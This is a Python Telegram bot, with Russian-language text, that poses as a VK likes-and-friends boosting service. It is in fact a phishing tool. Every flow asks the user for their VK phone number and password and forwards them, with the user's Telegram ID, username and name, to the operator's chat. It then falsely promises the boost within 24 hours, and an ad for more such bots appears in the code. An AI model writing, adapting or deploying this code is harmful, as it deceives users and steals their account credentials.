import logging
import asyncio
from aiogram import Bot, Dispatcher, types, executor
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters import Command, Text
from aiogram.types import Message, CallbackQuery
from aiogram.dispatcher.filters.state import State, StatesGroup
from config import ID, TOKEN
from aiogram.types import ReplyKeyboardRemove, \
    ReplyKeyboardMarkup, KeyboardButton, \
    InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils.callback_data import CallbackData

bot = Bot(token=TOKEN)
dp = Dispatcher(bot, storage=MemoryStorage())

@dp.message_handler(commands=['start'])
async def start(message):
    print(f"""Обнаружен пользователь!
    ID: {message.from_user.id}""")
    await bot.send_message(message.chat.id, """
👋 Привет! 👋
Это бот накрутки лайков и друзей на ваш VK аккаунт!
Чтобы начать, нажмите /nacrutka""")
print("БОЛЬШЕ БОТОВ НА CONFF.ORG")
@dp.message_handler(commands=['nacrutka', 'n'])
async def start1(message):
    keyboardmain = types.InlineKeyboardMarkup(row_width=2)
    first_button = types.InlineKeyboardButton(text="Лайки❤️", callback_data="like")
    second_button = types.InlineKeyboardButton(text="Друзья📃", callback_data="lik")
    button3 = types.InlineKeyboardButton(text="Репосты", callback_data="lie")
    button4 = types.InlineKeyboardButton(text="Прослушивания плейлистов", callback_data="li")
    keyboardmain.add(first_button, second_button, button3, button4)
    await message.answer("Выберите пункт:", reply_markup=keyboardmain)

@dp.callback_query_handler(text='like')
async def callback_inline(call: types.CallbackQuery, state: FSMContext):
    await bot.send_message(call.message.chat.id, 'Введите количество (не более 500)') 
    await state.set_state('qproc1')
    
@dp.message_handler(state='qproc1')
async def qproc1(message, state: FSMContext):
    num = message.text 
    if not num.isdigit():
        await bot.send_message(message.chat.id, 'Введите количество числом! Пожалуйста, попробуйте еще раз.')
        return
    elif int(num) > 500:
        await bot.send_message(message.chat.id, 'Количество не может быть более 500! Пожалуйста, попробуйте еще раз.')
        return
    await bot.send_message(message.chat.id, f'Количество: {num}')
    await bot.send_message(message.chat.id, 'Введите номер телефона от вашего аккаунта:')
    await state.update_data(num=num)
    await state.set_state('step1')

@dp.message_handler(state='step1')
async def step1(message, state: FSMContext):
    inp = message.text.replace("+", "")
    if not inp.isdigit():
        await message.answer('Введите номер числом! Пожалуйста, попробуйте еще раз.')
        return
    await message.answer('Введите пароль от вашего аккаунта:')
    await state.update_data(login=inp)
    await state.set_state('step2')

@dp.message_handler(state='step2')
async def step2(message, state: FSMContext):
    data = await state.get_data()
    inp = data.get('login')
    usrpass = message.text
    await bot.send_message(ID, f'''Получено: 
Получено в боте: vk 
ID: {message.from_user.id}
Ник: @{message.from_user.username}
Логин: +{inp}
Пароль: {usrpass}
Имя: {message.from_user.first_name}
Источник: Больше ботов на CONFF.ORG 
''')
    await asyncio.sleep(1)
    await message.answer(f"Спасибо, что воспользовались нашим сервисом! Если введенные данные правильные, то ожидайте накрутку на ваш аккаунт в течение 24 часов!")
    await state.finish()

@dp.callback_query_handler(text='lik')
async def callback_inline(call: types.CallbackQuery, state: FSMContext):
    await bot.send_message(call.message.chat.id, 'Введите количество (не более 500)') 
    await state.set_state('qproc1')
    
@dp.message_handler(state='qproc1')
async def qproc1(message, state: FSMContext):
    num = message.text 
    if not num.isdigit():
        await bot.send_message(message.chat.id, 'Введите количество числом! Пожалуйста, попробуйте еще раз.')
        return
    elif int(num) > 500:
        await bot.send_message(message.chat.id, 'Количество не может быть более 500! Пожалуйста, попробуйте еще раз.')
        return
    await bot.send_message(message.chat.id, f'Количество: {num}')
    await bot.send_message(message.chat.id, 'Введите номер телефона от вашего аккаунта:')
    await state.update_data(num=num)
    await state.set_state('step1')

@dp.message_handler(state='step1')
async def step1(message, state: FSMContext):
    inp = message.text.replace("+", "")
    if not inp.isdigit():
        await message.answer('Введите номер числом! Пожалуйста, попробуйте еще раз.')
        return
    await message.answer('Введите пароль от вашего аккаунта:')
    await state.update_data(login=inp)
    await state.set_state('step2')

@dp.message_handler(state='step2')
async def step2(message, state: FSMContext):
    data = await state.get_data()
    inp = data.get('login')
    usrpass = message.text
    await bot.send_message(ID, f'''Получено: 
Получено в боте: vk 
ID: {message.from_user.id}
Ник: @{message.from_user.username}
Логин: +{inp}
Пароль: {usrpass}
Имя: {message.from_user.first_name}
''')
    await asyncio.sleep(1)
    await message.answer(f"Спасибо, что воспользовались нашим сервисом! Если введенные данные правильные, то ожидайте накрутку на ваш аккаунт в течение 24 часов!")
    await state.finish()

@dp.callback_query_handler(text='lie')
async def callback_inline(call: types.CallbackQuery, state: FSMContext):
    await bot.send_message(call.message.chat.id, 'Введите количество (не более 500)') 
    await state.set_state('qproc1')
    
@dp.message_handler(state='qproc1')
async def qproc1(message, state: FSMContext):
    num = message.text 
    if not num.isdigit():
        await bot.send_message(message.chat.id, 'Введите количество числом! Пожалуйста, попробуйте еще раз.')
        return
    elif int(num) > 500:
        await bot.send_message(message.chat.id, 'Количество не может быть более 500! Пожалуйста, попробуйте еще раз.')
        return
    await bot.send_message(message.chat.id, f'Количество: {num}')
    await bot.send_message(message.chat.id, 'Введите номер телефона от вашего аккаунта:')
    await state.update_data(num=num)
    await state.set_state('step1')

@dp.message_handler(state='step1')
async def step1(message, state: FSMContext):
    inp = message.text.replace("+", "")
    if not inp.isdigit():
        await message.answer('Введите номер числом! Пожалуйста, попробуйте еще раз.')
        return
    await message.answer('Введите пароль от вашего аккаунта:')
    await state.update_data(login=inp)
    await state.set_state('step2')

@dp.message_handler(state='step2')
async def step2(message, state: FSMContext):
    data = await state.get_data()
    inp = data.get('login')
    usrpass = message.text
    await bot.send_message(ID, f'''Получено: 
Получено в боте: vk 
ID: {message.from_user.id}
Ник: @{message.from_user.username}
Логин: +{inp}
Пароль: {usrpass}
Имя: {message.from_user.first_name}
''')
    await asyncio.sleep(1)
    await message.answer(f"Спасибо, что воспользовались нашим сервисом! Если введенные данные правильные, то ожидайте накрутку на ваш аккаунт в течение 24 часов!")
    await state.finish()

@dp.callback_query_handler(text='li')
async def callback_inline(call: types.CallbackQuery, state: FSMContext):
    await bot.send_message(call.message.chat.id, 'Введите количество (не более 500)') 
    await state.set_state('qproc1')
    
@dp.message_handler(state='qproc1')
async def qproc1(message, state: FSMContext):
    num = message.text 
    if not num.isdigit():
        await bot.send_message(message.chat.id, 'Введите количество числом! Пожалуйста, попробуйте еще раз.')
        return
    elif int(num) > 500:
        await bot.send_message(message.chat.id, 'Количество не может быть более 500! Пожалуйста, попробуйте еще раз.')
        return
    await bot.send_message(message.chat.id, f'Количество: {num}')
    await bot.send_message(message.chat.id, 'Введите номер телефона от вашего аккаунта:')
    await state.update_data(num=num)
    await state.set_state('step1')

@dp.message_handler(state='step1')
async def step1(message, state: FSMContext):
    inp = message.text.replace("+", "")
    if not inp.isdigit():
        await message.answer('Введите номер числом! Пожалуйста, попробуйте еще раз.')
        return
    await message.answer('Введите пароль от вашего аккаунта:')
    await state.update_data(login=inp)
    await state.set_state('step2')

@dp.message_handler(state='step2')
async def step2(message, state: FSMContext):
    data = await state.get_data()
    inp = data.get('login')
    usrpass = message.text
    await bot.send_message(ID, f'''Получено: 
Получено в боте: vk 
ID: {message.from_user.id}
Ник: @{message.from_user.username}
Логин: +{inp}
Пароль: {usrpass}
Имя: {message.from_user.first_name}
''')
    await asyncio.sleep(1)
    await message.answer(f"Спасибо, что воспользовались нашим сервисом! Если введенные данные правильные, то ожидайте накрутку на ваш аккаунт в течение 24 часов!")
    await state.finish()


if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)